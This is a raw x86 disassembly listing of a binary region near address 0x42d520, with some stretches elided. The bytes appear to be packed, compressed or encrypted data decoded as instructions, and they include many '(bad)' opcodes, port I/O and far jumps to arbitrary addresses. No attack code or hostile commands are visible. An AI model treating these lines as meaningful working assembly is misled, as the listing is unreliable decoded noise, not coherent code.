  42d520:	nop
  42d521:	repz enter 0xc125,0xe8
  42d526:	push   esi
  42d527:	in     eax,0x1
  42d529:	add    BYTE PTR [edi],al
  42d52b:	add    DWORD PTR [eax],eax
  42d52d:	add    bl,al
  42d52f:	mov    WORD PTR [ecx+0xb],ss
  42d532:	sub    cl,BYTE PTR [esi]
  42d534:	jno    0x42d51f
  42d536:	xchg   esp,eax
  42d537:	adc    al,0x1b
  42d539:	sbb    al,BYTE PTR [ecx-0x1ecffae3]
  42d53f:	retf   0xfd1b
  42d542:	or     al,0x13
  42d544:	ret    0xe2a1
  42d547:	xchg   esi,eax
  42d548:	int3   
  42d549:	sbb    eax,0x81f5e04c
  42d54e:	cld    
  42d54f:	pop    ds
  42d550:	sti    
  42d551:	sub    eax,0x8e3a1bb8
  42d556:	jl     0x42d59c
  42d558:	or     eax,0x44b1a42a
  42d55d:	sub    esp,DWORD PTR [edi]
  42d55f:	mov    WORD PTR [ebp-0x5d],ds
  42d562:	sahf   
  42d563:	cs dec ebp
  42d565:	push   0xffffff88
  42d567:	stc    
  42d568:	dec    esi
  42d569:	in     eax,0x6a
  42d56b:	lea    ebx,[eax]
  42d56d:	test   al,0xeb
  42d56f:	clc    
  42d570:	jo     0x42d5d8
  42d572:	adc    BYTE PTR [edi+0x2b],0x57
  42d576:	or     al,0xcc
  42d578:	out    0x5a,al
  42d57a:	fcomp  QWORD PTR [ebp-0x2]
  42d57d:	xchg   DWORD PTR [ecx-0x4a46cb0d],ebp
  42d583:	xchg   dl,dl
  42d585:	je     0x42d5ad
  42d587:	mov    edx,0xf635051b
  42d58c:	out    dx,al
  42d58d:	and    al,0x5e
  42d58f:	shl    DWORD PTR [eax+0x45],0x4
  42d593:	cmc    
  42d594:	sar    DWORD PTR [esi+0x385b7b41],cl
  42d59a:	jl     0x42d5dc
  42d59c:	rol    DWORD PTR [ebp+edi*8+0x5e],0x40
  42d5a1:	dec    ebx
  42d5a2:	shl    BYTE PTR [ebx+0x170b3a20],1
  42d5a8:	mov    esi,0xaca44cc2
  42d5ad:	sbb    bh,BYTE PTR [esi+0x54a7eb8f]
  42d5b3:	push   ss
  42d5b4:	inc    ebp
  42d5b5:	jle    0x42d620
  42d5b7:	mov    BYTE PTR [esi-0x1d],cl
  42d5ba:	adc    eax,0x855a9862
  42d5bf:	pop    edi
  42d5c0:	in     eax,0xfe
  42d5c2:	out    dx,eax
  42d5c3:	ins    BYTE PTR es:[edi],dx
  42d5c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d5c5:	jbe    0x42d60b
  42d5c7:	pusha  
  42d5c8:	jns    0x42d561
  42d5ca:	jo     0x42d637
  42d5cc:	arpl   sp,dx
  42d5ce:	or     DWORD PTR [ebx-0xf],0xb89b9834
  42d5d5:	nop
  42d5d6:	adc    BYTE PTR [ebx+0x27],cl
  42d5d9:	jle    0x42d5b9
  42d5db:	pop    esi
  42d5dc:	sahf   
  42d5dd:	stos   BYTE PTR es:[edi],al
  42d5de:	arpl   WORD PTR [ecx],si
  42d5e0:	xchg   esi,eax
  42d5e1:	dec    esi
  42d5e2:	test   al,0x1d
  42d5e4:	addr16 xchg ecx,eax
  42d5e6:	jmp    0x5a58258b
  42d5eb:	repz dec ecx
  42d5ed:	mov    bh,0xd5
  42d5ef:	(bad)  
  42d5f1:	jmp    0x96be:0x9e97d385
  42d5f8:	adc    al,0xf8
  42d5fa:	push   cs
  42d5fb:	fwait
  42d5fc:	and    al,0x13
  42d5fe:	cli    
  42d5ff:	mov    bp,WORD PTR [ebp+0x307c8941]
  42d606:	push   edx
  42d607:	ja     0x42d599
  42d609:	in     al,0x6b
  42d60b:	stos   DWORD PTR es:[edi],eax
  42d60c:	xchg   edx,eax
  42d60d:	ret    0xc00f
  42d610:	pop    eax
  42d611:	sub    eax,DWORD PTR [ecx]
  42d613:	pop    eax
  42d614:	xor    al,0x41
  42d616:	loope  0x42d5eb
  42d618:	xchg   edx,eax
  42d619:	scas   al,BYTE PTR es:[edi]
  42d61a:	(bad)  
  42d61b:	jge    0x42d646
  42d61d:	mov    ebp,0x1945a6ab
  42d622:	clc    
  42d623:	stos   DWORD PTR es:[edi],eax
  42d624:	aam    0xab
  42d626:	nop
  42d627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d628:	sbb    BYTE PTR [ebp-0x4b9f7905],cl
  42d62e:	or     eax,DWORD PTR [esi+ecx*1-0x65ca0eb4]
	...
  42d695:	add    bl,dh
  42d697:	add    esp,DWORD PTR [eax]
  42d699:	(bad)  
  42d69a:	lock scas eax,DWORD PTR es:[edi]
  42d69c:	(bad)  
  42d69d:	jg     0x42d702
  42d69f:	mov    esp,0xfec98d59
  42d6a4:	test   DWORD PTR [ecx],edx
  42d6a6:	pop    ebp
  42d6a7:	out    0x1,al
  42d6a9:	add    BYTE PTR [edi],al
  42d6ab:	add    DWORD PTR [eax],eax
  42d6ad:	add    BYTE PTR [eax+0x32],ah
  42d6b0:	fcmovu st,st(0)
  42d6b2:	adc    dl,bh
  42d6b4:	or     bl,BYTE PTR [eax+0x7fe23c22]
  42d6ba:	sub    DWORD PTR [edi-0x5598958],edi
  42d6c0:	mov    ecx,0x7769c226
  42d6c5:	(bad)  
  42d6c6:	mov    bl,0xc3
  42d6c8:	sbb    eax,0x5396e9e1
  42d6cd:	(bad)  
  42d6ce:	dec    ebx
  42d6cf:	adc    eax,0x4445f7dd
  42d6d4:	xor    cl,al
  42d6d6:	add    al,0xb1
  42d6d8:	sub    BYTE PTR [ebp+0x50ed468f],dh
  42d6de:	xchg   edi,eax
  42d6df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d6e0:	xchg   ebx,eax
  42d6e1:	mov    ebp,0x495907b4
  42d6e6:	inc    ebp
  42d6e7:	(bad)  
  42d6e8:	cmp    DWORD PTR [ebp-0x5f1a9a27],edi
  42d6ee:	ds nop
  42d6f0:	add    ah,ah
  42d6f2:	push   ss
  42d6f3:	xchg   edx,eax
  42d6f4:	mov    esp,0xb511dde7
  42d6f9:	out    0x34,eax
  42d6fb:	jmp    0x42d72c
  42d6fd:	(bad)
  42d700:	repz pusha 
  42d702:	pop    eax
  42d703:	sbb    al,0x7
  42d705:	push   ds
  42d706:	jnp    0x42d6ae
  42d708:	jb     0x42d730
  42d70a:	clc    
  42d70b:	out    0x42,eax
  42d70d:	inc    esi
  42d70e:	xchg   BYTE PTR [ecx-0x1e],ah
  42d711:	into   
  42d712:	ins    DWORD PTR es:[edi],dx
  42d713:	xor    DWORD PTR [ebx-0x27],edx
  42d716:	test   eax,0xdf5c0935
  42d71b:	das    
  42d71c:	xor    DWORD PTR [esi-0x1c07fcbd],esi
  42d722:	inc    edx
  42d723:	shl    DWORD PTR [eax-0x5217acc6],0xfd
  42d72a:	adc    ebx,esp
  42d72c:	dec    esp
  42d72d:	call   0xad311b6a
  42d732:	mov    WORD PTR [eax-0x511c674b],cs
  42d738:	jae    0x42d778
  42d73a:	push   eax
  42d73b:	cmp    eax,0xd27d90d7
  42d740:	and    DWORD PTR [edi+0x2429e6ea],ecx
  42d746:	arpl   WORD PTR [ecx+0x7],bx
  42d749:	ja     0x42d788
  42d74b:	xchg   edi,eax
  42d74c:	imul   eax,esp,0x6441e064
  42d752:	dec    esp
  42d753:	mov    ss,WORD PTR [esi]
  42d755:	jae    0x42d6e8
  42d757:	push   0xffffffc7
  42d759:	lds    ecx,FWORD PTR [ecx-0x7c]
  42d75c:	ins    BYTE PTR es:[edi],dx
  42d75d:	inc    esi
  42d75e:	call   0xc7719af7
  42d763:	add    DWORD PTR [eax+eax*2],eax
  42d766:	rcr    DWORD PTR [eax+0x46a9d70d],1
  42d76c:	or     eax,DWORD PTR [ecx]
  42d76e:	inc    eax
  42d76f:	aas    
  42d770:	fisttp DWORD PTR [edi]
  42d772:	loope  0x42d7d2
  42d774:	sbb    edi,DWORD PTR [eax]
  42d776:	or     al,0xf7
  42d778:	xchg   edi,eax
  42d779:	(bad)  
  42d77a:	fimul  DWORD PTR [ecx]
  42d77c:	mov    bl,bl
  42d77e:	loope  0x42d715
  42d780:	cmp    BYTE PTR [ebx-0xc211e50],bh
  42d786:	add    edi,DWORD PTR [edi]
  42d788:	jo     0x42d75f
  42d78a:	mov    bl,0xca
  42d78c:	inc    ebx
  42d78d:	les    eax,FWORD PTR [eax-0x3c]
  42d790:	jne    0x42d7ca
  42d792:	mov    esp,0x88f6bad2
  42d797:	mov    DWORD PTR [ecx+0x13],ebp
  42d79a:	fsub   st(4),st
  42d79c:	fst    DWORD PTR [eax]
  42d79e:	jae    0x42d73b
  42d7a0:	out    0x1d,al
  42d7a2:	sbb    BYTE PTR [ebp-0x41],al
  42d7a5:	mov    DWORD PTR [eax+0x26],ecx
  42d7a8:	sub    esi,eax
  42d7aa:	lea    edi,[esp+edi*4]
  42d7ad:	add    DWORD PTR [ebp+0x3f],esi
  42d7b0:	outs   dx,BYTE PTR ds:[si]
  42d7b2:	sbb    ch,dl
  42d7b4:	push   ss
	...
  42d815:	add    BYTE PTR [esi-0x62a06765],dl
  42d81b:	pop    edi
  42d81c:	xlat   BYTE PTR ds:[ebx]
  42d81d:	fld    TBYTE PTR [eax-0x2b]
  42d820:	push   0xe176ec95
  42d825:	cwde   
  42d826:	fs out 0x1,eax
  42d829:	add    BYTE PTR [edi],al
  42d82b:	add    DWORD PTR [eax],eax
  42d82d:	add    BYTE PTR [edx],bh
  42d82f:	repz pop edi
  42d831:	cwde   
  42d832:	sbb    edx,DWORD PTR gs:[edx+0x39]
  42d836:	test   eax,0x5937339b
  42d83b:	mov    eax,ds:0xbf5dee14
  42d840:	into   
  42d841:	xchg   ecx,eax
  42d842:	xor    ecx,ebp
  42d844:	cwde   
  42d845:	shl    DWORD PTR [bx+si-0x4c],cl
  42d849:	xor    eax,0x7801548
  42d84e:	jbe    0x42d867
  42d850:	push   edx
  42d851:	mov    WORD PTR [esi],?
  42d853:	mov    DWORD PTR [edx],ebx
  42d855:	xchg   DWORD PTR [edi],ebx
  42d857:	(bad)  
  42d858:	hlt    
  42d859:	and    al,0x94
  42d85b:	or     DWORD PTR [eax-0x2f409251],esp
  42d861:	push   0x5c
  42d863:	call   0xc49f:0x214faa35
  42d86a:	push   eax
  42d86b:	inc    ebx
  42d86c:	mov    ebx,0x9ca7585b
  42d871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d872:	(bad)  
  42d873:	cmp    ecx,DWORD PTR [ebp+0x174aab51]
  42d879:	rol    BYTE PTR [edx-0x5459c4b],cl
  42d87f:	int3   
  42d880:	or     cl,dh
  42d882:	jle    0x42d87d
  42d884:	push   esi
  42d885:	mov    al,es:0x37a44095
  42d88b:	loopne 0x42d8bc
  42d88d:	in     eax,dx
  42d88e:	jns    0x42d909
  42d890:	or     BYTE PTR [ebp+0x43],al
  42d893:	into   
  42d894:	fsub   DWORD PTR [esi+0x6ae5dd61]
  42d89a:	in     al,dx
  42d89b:	aaa    
  42d89c:	cmp    DWORD PTR [esi],edx
  42d89e:	pop    esi
  42d89f:	repz pop ecx
  42d8a1:	and    ch,BYTE PTR [eax-0x7f837550]
  42d8a7:	fsubr  st(2),st
  42d8a9:	pop    ds
  42d8aa:	sahf   
  42d8ab:	xchg   esi,eax
  42d8ac:	or     BYTE PTR [edi+0x5e689d18],al
  42d8b2:	jl     0x42d885
  42d8b4:	out    dx,eax
  42d8b5:	sahf   
  42d8b6:	popa   
  42d8b7:	(bad)  
  42d8b8:	repnz aaa 
  42d8ba:	sbb    bl,BYTE PTR [ebp+eax*1-0x7f]
  42d8be:	xor    DWORD PTR [edi-0x31],ecx
  42d8c1:	sub    ah,dl
  42d8c3:	daa    
  42d8c4:	cmp    BYTE PTR [edx],dl
  42d8c6:	je     0x42d946
  42d8c8:	push   cs
  42d8c9:	mov    ch,0x78
  42d8cb:	hlt    
  42d8cc:	pop    ebp
  42d8cd:	xchg   ebx,ecx
  42d8cf:	adc    BYTE PTR [edi+ebx*4-0x5],dl
  42d8d3:	popa   
  42d8d4:	xor    DWORD PTR ds:0x2887b1f9,esp
  42d8da:	xor    ebx,edx
  42d8dc:	lods   al,BYTE PTR ds:[esi]
  42d8dd:	inc    ebp
  42d8de:	pop    ds
  42d8df:	mov    ebx,edi
  42d8e1:	out    0xd8,eax
  42d8e3:	inc    ebx
  42d8e4:	pop    ebp
  42d8e5:	push   ecx
  42d8e6:	pop    edi
  42d8e7:	jb     0x42d87a
  42d8e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d8ea:	push   ds
  42d8eb:	jnp    0x42d8ee
  42d8ed:	jecxz  0x42d881
  42d8ef:	mov    al,ds:0x6381fc6
  42d8f4:	sub    al,0x23
  42d8f6:	inc    edx
  42d8f7:	sbb    BYTE PTR [eax-0x75fba2f7],ah
  42d8fd:	or     bh,ah
  42d8ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d900:	test   BYTE PTR [edi+0x1f94bba6],bh
  42d906:	pop    esp
  42d907:	jp     0x42d959
  42d909:	xchg   ecx,eax
  42d90a:	das    
  42d90b:	jmp    0xd79157d5
  42d910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d911:	in     eax,0x17
  42d913:	mov    BYTE PTR [esi],bl
  42d915:	(bad)  
  42d916:	or     eax,DWORD PTR [eax+0x46]
  42d919:	test   BYTE PTR [ebx+0x5e21c8dd],ch
  42d91f:	add    DWORD PTR [ecx+0x2c],0xffffffb6
  42d923:	adc    DWORD PTR [ecx+0xaaebbf7],edx
  42d929:	imul   ecx,ecx,0x1045ef09
  42d92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d930:	loope  0x42d965
  42d932:	push   ss
  42d933:	das    
  42d934:	popf   
	...
  42d995:	add    cl,bh
  42d997:	mov    cl,0x70
  42d999:	dec    eax
  42d99a:	js     0x42d965
  42d99c:	stc    
  42d99d:	mov    cl,0xcb
  42d99f:	mov    DWORD PTR ds:0xa06a1914,ecx
  42d9a5:	jmp    0x107:0x1e86b
  42d9ac:	add    BYTE PTR [eax],al
  42d9ae:	int3   
  42d9af:	jmp    DWORD PTR [edx+0x4c]
  42d9b2:	lds    eax,FWORD PTR [eax*1-0x4314bf52]
  42d9b9:	ret    
  42d9ba:	nop
  42d9bb:	mov    ch,0xe7
  42d9bd:	adc    DWORD PTR [eax+0x22],0x268ac2ad
  42d9c4:	xchg   esi,eax
  42d9c5:	dec    eax
  42d9c6:	mov    ss,WORD PTR [esi+0x24]
  42d9c9:	mov    esi,0x3b397dd1
  42d9ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d9cf:	pusha  
  42d9d0:	jae    0xc8c52b1a
  42d9d6:	and    ch,0xe9
  42d9d9:	pop    ss
  42d9da:	mov    ?,WORD PTR [ecx+0x69e241b6]
  42d9e0:	xor    bh,cl
  42d9e2:	mov    eax,ds:0x3d17d118
  42d9e7:	int    0x3b
  42d9e9:	repnz mov BYTE PTR [esi+0x42],ch
  42d9ed:	mov    bh,0x49
  42d9ef:	nop
  42d9f0:	ror    BYTE PTR ds:0x309c346e,1
  42d9f6:	lock mov ecx,0xb6e97ae7
  42d9fc:	sar    BYTE PTR [edi],0x34
  42d9ff:	(bad)  
  42da01:	fdivr  st(4),st
  42da03:	test   DWORD PTR [ebx],0xc9cab8b1
  42da09:	sbb    DWORD PTR [edi],esp
  42da0b:	stos   BYTE PTR es:[edi],al
  42da0c:	cld    
  42da0d:	xor    BYTE PTR [esi+0x121828d8],dh
  42da13:	push   esi
  42da14:	repnz aam 0xbb
  42da17:	je     0x42da8f
  42da19:	ss out dx,eax
  42da1b:	mov    dh,BYTE PTR [esi-0x1d128faf]
  42da21:	repnz div DWORD PTR ds:0xea73be08
  42da28:	add    ah,BYTE PTR [ecx+ebp*4]
  42da2b:	jne    0x42d9d1
  42da2d:	ret    
  42da2e:	push   0x32
  42da30:	push   0xeaa98c00
  42da35:	jnp    0x42da78
  42da37:	jbe    0x42da48
  42da39:	lock pusha 
  42da3b:	cmp    edx,DWORD PTR [ebx+0xc]
  42da3e:	(bad)  [ecx-0x3e]
  42da41:	xor    DWORD PTR [edx],ebx
  42da43:	xor    ebx,esp
  42da45:	or     dh,BYTE PTR [esi]
  42da47:	push   ecx
  42da48:	xchg   esp,eax
  42da49:	enter  0xdc0d,0xd5
  42da4d:	inc    ebx
  42da4e:	and    cl,BYTE PTR ds:0x79965a0e
  42da54:	jae    0x42da85
  42da56:	cmp    ecx,DWORD PTR [eax+0x3d]
  42da59:	dec    ebp
  42da5a:	adc    esi,DWORD PTR [edx+0x189ca276]
  42da60:	aad    0xd2
  42da62:	fld    QWORD PTR [esi+eax*4-0x5adf4769]
  42da69:	gs leave 
  42da6b:	xchg   ecx,eax
  42da6c:	ja     0x42da65
  42da6e:	sbb    BYTE PTR [ebp-0x36c80879],dh
  42da74:	sbb    ebx,esi
  42da76:	loope  0x42da13
  42da78:	push   ecx
  42da79:	fldcw  WORD PTR [esi-0x3f]
  42da7c:	addr16 iret 
  42da7e:	pop    esp
  42da7f:	jmp    0xd839:0x8367171
  42da86:	loopne 0x42da61
  42da88:	test   eax,0xfa41c8d4
  42da8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42da8e:	dec    ebp
  42da8f:	and    DWORD PTR [edi+0x3e9d61d8],esi
  42da95:	mov    ch,0x2
  42da97:	test   al,0x36
  42da99:	jmp    0x42db13
  42da9b:	int3   
  42da9c:	xor    al,0xea
  42da9e:	ret    0x4849
  42daa1:	hlt    
  42daa2:	sub    eax,0xf880dd84
  42daa7:	mov    dh,0x38
  42daa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42daaa:	inc    edi
  42daab:	cwde   
  42daac:	lds    ebp,FWORD PTR [eax+0x80a1d3d]
  42dab2:	sbb    eax,0xde42
	...
  42db13:	add    BYTE PTR [eax],al
  42db15:	add    BYTE PTR [eax-0x2093e086],dh
  42db1b:	ins    DWORD PTR es:[edi],dx
  42db1c:	repz inc cl
  42db1f:	jae    0x42db79
  42db21:	jg     0x42db07
  42db23:	mov    eax,ds:0xe9722f21
  42db28:	add    DWORD PTR [eax],eax
  42db2a:	pop    es
  42db2b:	add    DWORD PTR [eax],eax
  42db2d:	add    BYTE PTR [edx-0x58],dl
  42db30:	jmp    DWORD PTR [ebp+0x2e56ae67]
  42db36:	aam    0xac
  42db38:	enter  0xc2d3,0x27
  42db3c:	pop    esp
  42db3d:	sbb    eax,0x86dbc39f
  42db42:	mov    DWORD PTR [edx+ebp*1+0x420645f8],edi
  42db49:	jl     0x42db8f
  42db4b:	mov    ds:0x4783054c,eax
  42db50:	jne    0x42dbb3
  42db52:	mov    ah,0x61
  42db54:	and    esi,DWORD PTR [eax+0x5bbd5e6b]
  42db5a:	hlt    
  42db5b:	sbb    eax,0x67ecb07e
  42db60:	addr16 pop edi
  42db62:	adc    ecx,ebx
  42db64:	rcr    DWORD PTR [eax],0xcf
  42db67:	mov    dh,al
  42db69:	fs mov ebp,0xd71f0c73
  42db6f:	lods   eax,DWORD PTR ds:[esi]
  42db70:	fmul   QWORD PTR ds:[esi]
  42db73:	push   0xffffffdd
  42db75:	jbe    0x42db47
  42db77:	jecxz  0x42db9f
  42db79:	mov    esp,0x52bacd26
  42db7f:	mov    esi,0xbd1782b
  42db84:	leave  
  42db85:	mov    bl,0x84
  42db87:	pop    edx
  42db88:	sti    
  42db89:	and    eax,edx
  42db8b:	mov    ah,0xaf
  42db8d:	jne    0x42db7f
  42db8f:	fstp   QWORD PTR [eax+0x1ab66de0]
  42db95:	xlat   BYTE PTR ds:[ebx]
  42db96:	rol    dl,1
  42db98:	or     edi,ecx
  42db9a:	pop    ds
  42db9b:	pop    ebp
  42db9c:	ret    0x6682
  42db9f:	push   ecx
  42dba0:	cld    
  42dba1:	retf   
  42dba2:	lods   al,BYTE PTR ds:[esi]
  42dba3:	xor    dl,ah
  42dba5:	sub    edi,0xffffffb8
  42dba8:	add    BYTE PTR [edx+0x9],0xc8
  42dbac:	add    BYTE PTR ds:0x8e193350,ch
  42dbb2:	xchg   ecx,eax
  42dbb3:	pop    esp
  42dbb4:	pop    esp
  42dbb5:	sbb    ecx,DWORD PTR [esi+0x2d]
  42dbb8:	inc    ebx
  42dbb9:	dec    esp
  42dbba:	ffree  st(0)
  42dbbc:	adc    eax,0xd2ab577a
  42dbc1:	(bad)  
  42dbc3:	ja     0x42dbf9
  42dbc5:	xor    cl,BYTE PTR [ebp+0x5d]
  42dbc8:	and    bh,ch
  42dbca:	inc    edi
  42dbcb:	outs   dx,BYTE PTR ds:[esi]
  42dbcc:	and    BYTE PTR [ebx+0x1a],bh
  42dbcf:	shr    DWORD PTR [ecx],1
  42dbd1:	leave  
  42dbd2:	nop
  42dbd3:	and    cl,BYTE PTR [edi-0x7e]
  42dbd6:	and    dl,BYTE PTR [ebp-0x15]
  42dbd9:	mov    ch,0x84
  42dbdb:	scas   eax,DWORD PTR es:[edi]
  42dbdc:	retf   0x4de2
  42dbdf:	sub    BYTE PTR [edi],al
  42dbe1:	fidiv  DWORD PTR [edx]
  42dbe3:	outs   dx,BYTE PTR ds:[esi]
  42dbe4:	rcl    BYTE PTR [eax-0x71],cl
  42dbe7:	out    0xa7,al
  42dbe9:	mov    dl,0x75
  42dbeb:	aas    
  42dbec:	sar    BYTE PTR [eax-0x79b1a524],cl
  42dbf2:	mov    esp,0x5f84d184
  42dbf7:	repnz push 0xffffffe3
  42dbfa:	into   
  42dbfb:	lea    ebx,ds:0xcff620c2
  42dc01:	jno    0x42dbf6
  42dc03:	or     edi,esi
  42dc05:	jp     0x42dbbf
  42dc07:	call   DWORD PTR ds:0xaa25d504
  42dc0d:	rol    BYTE PTR [ecx],cl
  42dc0f:	(bad)  
  42dc10:	adc    edx,edi
  42dc12:	icebp  
  42dc13:	mov    ebx,0x9fa31528
  42dc18:	sbb    dl,BYTE PTR [edi+0x37]
  42dc1b:	data16 cmp BYTE PTR [edx+ebp*8+0x5fad7bc1],bl
  42dc23:	inc    edi
  42dc24:	movaps xmm1,XMMWORD PTR [ebx+0x239a6962]
  42dc2b:	fisttp QWORD PTR [edx+edx*2+0x3aa1aab]
  42dc32:	sbb    bh,ah
  42dc34:	push   edi
	...
  42dc95:	add    BYTE PTR [ecx],bh
  42dc97:	mov    bh,0x6d
  42dc99:	pxor   mm3,mm7
  42dc9c:	jnp    0x42dc55
  42dc9e:	es mov esp,0x6372f285
  42dca4:	(bad)  
  42dca5:	sub    edi,DWORD PTR [ecx-0x16]
  42dca8:	add    DWORD PTR [eax],eax
  42dcaa:	pop    es
  42dcab:	add    DWORD PTR [eax],eax
  42dcad:	add    cl,bh
  42dcaf:	out    dx,eax
  42dcb0:	or     ecx,DWORD PTR [ebp-0x7f]
  42dcb3:	sub    eax,0x56832b3e
  42dcb8:	aam    0x26
  42dcba:	lds    esi,FWORD PTR [ebp+0x4f01f235]
  42dcc0:	mov    ecx,0x7e3976ed
  42dcc5:	jmp    0xdb9f0f72
  42dcca:	ins    DWORD PTR es:[edi],dx
  42dccb:	sbb    DWORD PTR [ebx-0x35],ebx
  42dcce:	inc    ecx
  42dccf:	xchg   BYTE PTR [esi+esi*4],ah
  42dcd2:	sub    edi,DWORD PTR [eax]
  42dcd4:	adc    ebx,DWORD PTR [edx+0x4e3074a9]
  42dcda:	loopne 0x42dcda
  42dcdc:	jo     0x42dcda
  42dcde:	cmp    BYTE PTR [edi+0x4f],ch
  42dce1:	les    edi,FWORD PTR [eax-0x2c6eca79]
  42dce7:	jle    0x42dc79
  42dce9:	sub    ah,ch
  42dceb:	in     eax,dx
  42dcec:	outs   dx,BYTE PTR ds:[esi]
  42dced:	push   0x8f585b57
  42dcf2:	imul   ecx,DWORD PTR [ebx+0x5f52318a],0x7a5f1bce
  42dcfc:	xor    al,0x4c
  42dcfe:	xchg   edx,eax
  42dcff:	or     esp,eax
  42dd01:	sbb    eax,0x7cbb14b4
  42dd06:	inc    edx
  42dd07:	pop    edx
  42dd08:	ret    0x65e1
  42dd0b:	pusha  
  42dd0c:	adc    BYTE PTR [ecx+0x5a3c00a8],dl
  42dd12:	pushf  
  42dd13:	test   eax,0xc1a825d0
  42dd18:	out    dx,eax
  42dd19:	addr16 jne 0x42dcf0
  42dd1c:	push   ss
  42dd1d:	into   
  42dd1e:	jne    0x42dcb4
  42dd20:	and    ah,BYTE PTR [edi+0x11]
  42dd23:	jmp    0xc093:0x8043a8ab
  42dd2a:	dec    ebx
  42dd2b:	into   
  42dd2c:	aaa    
  42dd2d:	dec    ebx
  42dd2e:	push   ebx
  42dd2f:	hlt    
  42dd30:	test   DWORD PTR [edx],ebp
  42dd32:	xchg   edi,eax
  42dd33:	test   BYTE PTR [esi-0x15],0x8b
  42dd37:	(bad)  
  42dd39:	and    eax,0x204cb428
  42dd3e:	mov    bl,0xff
  42dd40:	shr    esp,1
  42dd42:	repnz sti 
  42dd44:	adc    eax,0x4f3c2dd4
  42dd49:	and    BYTE PTR [esi-0x3ead7897],dl
  42dd4f:	or     al,0x77
  42dd51:	popf   
  42dd52:	fs aad 0x92
  42dd55:	add    ch,al
  42dd57:	fs retf 0xe3c3
  42dd5b:	mov    edi,0x328e7e8a
  42dd60:	rcr    BYTE PTR [ebp-0x8],1
  42dd63:	pop    edx
  42dd64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd65:	push   0x2e
  42dd67:	mov    bl,0x72
  42dd69:	sbb    esi,edx
  42dd6b:	fst    QWORD PTR [esi+0x175bd98f]
  42dd71:	outs   dx,DWORD PTR ds:[esi]
  42dd72:	ror    edi,0x52
  42dd75:	cmp    DWORD PTR [eax-0x5f4105b7],ecx
  42dd7b:	out    dx,eax
  42dd7c:	mov    esi,DWORD PTR [esi+0x4960acb1]
  42dd82:	(bad)  
  42dd83:	cli    
  42dd84:	call   0x273fb976
  42dd89:	xor    BYTE PTR [ecx+0x48dc5b54],0x4e
  42dd90:	inc    edi
  42dd91:	add    esi,DWORD PTR [eax-0x56]
  42dd94:	adc    al,0xe0
  42dd96:	mov    cl,0x13
  42dd98:	loopne 0x42dda2
  42dd9a:	push   esp
  42dd9b:	lea    ebx,[ecx-0x21]
  42dd9e:	sahf   
  42dd9f:	xlat   BYTE PTR ds:[ebx]
  42dda0:	xchg   DWORD PTR [ebx-0x4b236d59],ebp
  42dda6:	or     al,0x98
  42dda8:	cmp    ebx,0xe3ad81f3
  42ddae:	pop    edi
  42ddaf:	pop    eax
  42ddb0:	fmul   QWORD PTR [edi+0xd93ed7]
	...
  42de16:	out    0x82,al
  42de18:	lods   eax,DWORD PTR ds:[esi]
  42de19:	xor    ebp,ebp
  42de1b:	aas    
  42de1c:	(bad)  
  42de1d:	xlat   BYTE PTR ds:[ebx]
  42de1e:	jns    0x42ddf6
  42de20:	mov    ebp,0x59d3c707
  42de25:	jb     0x42dda7
  42de27:	jmp    0x42de2a
  42de29:	add    BYTE PTR [edi],al
  42de2b:	add    DWORD PTR [eax],eax
  42de2d:	add    BYTE PTR [eax-0x5260de3b],dl
  42de33:	push   edi
  42de34:	and    BYTE PTR [edi-0x1d],0xa2
  42de38:	mov    ecx,0xbd3aa94
  42de3d:	mov    BYTE PTR fs:[ecx+ebx*8],ch
  42de41:	cmp    ebp,edi
  42de43:	adc    al,0xfa
  42de45:	cs mov dh,0xf4
  42de48:	call   FWORD PTR [edi-0xd060f9f]
  42de4e:	test   ah,ch
  42de50:	or     bl,BYTE PTR [ebp-0x4c]
  42de53:	sbb    al,BYTE PTR [ecx+0x54]
  42de56:	fsub   DWORD PTR ds:[esi-0x451882aa]
  42de5d:	pop    eax
  42de5e:	cmp    ah,ch
  42de60:	and    edi,DWORD PTR [eax-0x1f]
  42de63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de64:	pop    es
  42de65:	loopne 0x42deb4
  42de67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42de68:	mov    edx,0x7c51211e
  42de6d:	ja     0x42ddfe
  42de6f:	in     al,dx
  42de70:	jnp    0x42dea5
  42de72:	in     al,0xd4
  42de74:	in     eax,0xc1
  42de76:	mov    eax,DWORD PTR [esi+0x2d]
  42de79:	nop
  42de7a:	ret    
  42de7b:	xor    DWORD PTR [ecx-0x5f],esi
  42de7e:	lahf   
  42de7f:	retf   0x4ee8
  42de82:	aas    
  42de83:	adc    ch,BYTE PTR [ebx-0x1f]
  42de86:	fdivr  DWORD PTR [edi]
  42de88:	rcr    DWORD PTR [esi+ebx*1],cl
  42de8b:	scas   eax,DWORD PTR es:[edi]
  42de8c:	les    edx,FWORD PTR [edi+0x6f]
  42de8f:	xchg   DWORD PTR [esi],eax
  42de91:	(bad)  
  42de92:	dec    esp
  42de93:	ja     0x42de46
  42de95:	lods   al,BYTE PTR ds:[esi]
  42de96:	xor    BYTE PTR [eax],ch
  42de98:	enter  0xed61,0x19
  42de9c:	inc    edi
  42de9d:	dec    edx
  42de9e:	lock sahf 
  42dea0:	out    0x5e,eax
  42dea2:	add    BYTE PTR [ecx+0x69],ch
  42dea5:	int    0x62
  42dea7:	lock lods al,BYTE PTR ds:[esi]
  42dea9:	dec    cl
  42deab:	je     0x42de7f
  42dead:	pop    esp
  42deae:	ret    0x5eb4
  42deb1:	push   es
  42deb2:	dec    esi
  42deb3:	mov    bl,0x1c
  42deb5:	xor    DWORD PTR [ebp-0x74],0xffffff87
  42deb9:	cmp    edi,ecx
  42debb:	sbb    edx,DWORD PTR [ebx]
  42debd:	dec    ebp
  42debe:	pop    esi
  42debf:	inc    edi
  42dec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
